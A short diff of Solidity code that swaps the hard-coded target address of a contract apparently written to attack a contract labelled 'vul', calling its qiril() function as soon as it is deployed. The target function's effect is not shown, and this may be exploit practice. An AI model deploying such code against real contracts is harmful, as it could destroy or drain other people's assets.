@@ -5,7 +5,7 @@ interface qir{
 
    contract destuuur {
      //smeni
-       address payable vul=0xBdA6917B507475d3E9b56212562D4829d48BC3e1;// vul address
+       address payable vul=0x1502bb36EA8b8659D9115a309985a450b5671813;// vul address
        constructor() public{
         qir(vul).qiril();
     }
